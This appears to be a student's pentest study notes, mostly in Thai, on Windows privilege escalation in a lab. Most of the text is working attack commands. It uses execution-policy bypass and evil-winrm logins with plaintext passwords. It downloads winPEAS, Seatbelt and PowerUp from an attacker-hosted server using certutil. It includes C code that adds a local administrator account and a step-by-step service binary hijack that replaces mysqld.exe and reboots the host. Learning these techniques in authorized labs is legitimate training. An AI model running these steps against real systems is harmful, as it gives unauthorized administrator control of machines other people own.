[[mimikatz]]

```
git clone https://github.com/gentilkiwi/mimikatz.git

```

# Windows Privilege Escalation 

```
# Level 1 Win Priv Manual 

whoami 
# ตรวจสอบ Privilege ของ User ที่ใช้
whoami /priv
whoami /group

# ตรวจสอบ Localgroup ภายในเครื่องเป้าหมาย
net localgroup

# ตรวจสอบ Users ภายใน Groups Remote Management Users 
net localgroup "Remote Management Users"

# เข้าใช้งาน Powershell ภายใต้ Commandline Interface 
powershell -ep bypass

# ตรวจสอบสิทธิ admin 
Get-LocalGroupMember administrators

# ตรวจสอบรายละเอียด Application ที่ติดตั้งบน Computer
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" 
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*"

# ตรวจสอบเฉพาะชื่อแอพที่ติดตั้ง
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname

# ตรวจสอบ Process บนเครื่องเป้าหมาย 
powershell -ep bypass 
Get-Process

# ตรวจสอบรายละเอียดของ Process ชื่อ NonStandardProcess
Get-Process -Name "NonStandardProcess"| format-list *


# ค้นหาไฟล์ตาม File type ที่สนใจ
Get-ChildItem -Path C:\XAMPP -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.ini -File -Recurse -ErrorAction SilentlyContinue 

# คำสั่ง su หรือ Switch Users บน Windows 
runas /user:backupadmin cmd
# แล้วจะมีให้ใส่ password
Enter the password for backupadmin:
Attempting to start cmd as user "CLIENTWK220\backupadmin" 


# คำสั่งตรวจสอบ Powershell command History 
Get-History
(Get-PSReadlineOption).HistorySavePath



```

[[WinEventlogSearching]]
การตรวจสอบ Event ภายใต้ Windows สามารถใช้ Event Viewer ในการตรวจสอบที่ PATH: Application and service Logs > Microsoft > Windows > PowerShell > Operation   Script Block logging event in windows is 4104 

![[EventID4104.png]]

![[EVENTID4104-2.png]]


[[evil-winrm]]
```
# Command บน Kali สำหรับ Powershell ไปยัง Windows 
evil-winrm -i 192.168.50.220 -u daveadmin -p "qwertqwertqwert123\!\!"
```


Level 2 Automate tools 

```
ติดตั้ง WinPeas
sudo apt install peass 
updatedb 
locate winpeas
/usr/bin/winpeas
/usr/share/peass/winpeas
/usr/share/peass/winpeas/winPEAS.bat
/usr/share/peass/winpeas/winPEASany.exe
/usr/share/peass/winpeas/winPEASany_ofs.exe
/usr/share/peass/winpeas/winPEASx64.exe
/usr/share/peass/winpeas/winPEASx64_ofs.exe
/usr/share/peass/winpeas/winPEASx86.exe
/usr/share/peass/winpeas/winPEASx86_ofs.exe

python3 -m http.server 80
certutil.exe -urlcache -split -f http://192.168.45.241/winPEASx64.exe winPEASx64.exe
.\winPEASx64.exe


# Seatbelt Repo 
https://github.com/GhostPack/Seatbelt
# Download Binaries file@
https://github.com/r3motecontrol/Ghostpack-CompiledBinaries.git

python3 -m http.server 80 
certutil.exe -urlcache -split -f http://192.168.45.241/Seatbelt.exe Seatbelt.exe  
.\Searbelt.exe -group=all 

```


Level 3: Hack Windows Service 

```
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}

|Mask|Permissions|
|---|---|
|F|Full access|
|M|Modify access|
|RX|Read and execute access|
|R|Read-only access|
|W|Write-only access|

# ตรวจสอบสิทธิของ httpd.exe หรือ App ที่สนใจว่า user ที่เราใช้มีสิทธิอะไรบนไฟล์หรือ Service ดังกล่าว โดขให้มองหาสิทธิที่เป็น Full หรือ RX 
icacls "C:\xampp\apache\bin\httpd.exe"
icacls "C:\xampp\mysql\bin\mysqld.exe"
C:\xampp\mysql\bin\mysqld.exe BUILTIN\Administrators:(F)
                              NT AUTHORITY\SYSTEM:(F)
                              BUILTIN\Users:(F)

```

จากตัวอย่างจะเห็นว่า Buildin\Users: มีสิทธิ Full Access ฉะนั้นเราสามารถทำ [[Win Service Binary Hijacking]] ได้ 

```c
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user dave2 password123! /add");
  i = system ("net localgroup administrators dave2 /add");
  
  return 0;
}
```

จากนั้น ก็นำโปรแกรมไป Compire บน Kali 

```
# Compile adduser.c > .exe 
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe 

# download adduser.exe
certutil.exe -urlcache -split -f http://192.168.45.241/adduser.exe adduser.exe

# Backup ไฟล์ mysqld.exe กรณีพัง 
PS C:\Users\dave> move C:\xampp\mysql\bin\mysqld.exe C:\xampp\mysql\bin\mysqld2.exe.bkk       
move C:\xampp\mysql\bin\mysqld.exe C:\xampp\mysql\bin\mysqld2.exe.bkk

# เขียนทับ mysqld.exe ด้วย adduser.exe 
PS C:\Users\dave> copy adduser.exe C:\xampp\mysql\bin\mysqld.exe 
copy adduser.exe C:\xampp\mysql\bin\mysqld.exe 

# Restart เพื่อให้รัน Service
PS C:\Users\dave> shutdown /r /t 0 

Get-LocalGroupMember administrators

evil-winrm -i 192.168.222.220 -u dave2 -p 'password123!'

```


[[PowerUp.ps1]]

```
locate PowerUp
/usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 
cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 . 

certutil.exe -urlcache -split -f http://192.168.45.241/PowerUp.ps1 PowerUp.ps1

# จำเป็นต้องรันทุกครั้งก่อนรัน PowerUp
powershell -ep bypass
. .\PowerUp.ps1

# หลังจากติดตั้ง PowerUp เราสามารถตรวจสอบหา Service ที่สามารถแก้ไขได้และสามารถ upload adduser.exe ไปแทนได้ นั่นเอง
Get-ModifiableServiceFile 

```

![[Powerup-1.png]]![[PowerUp-2.png]]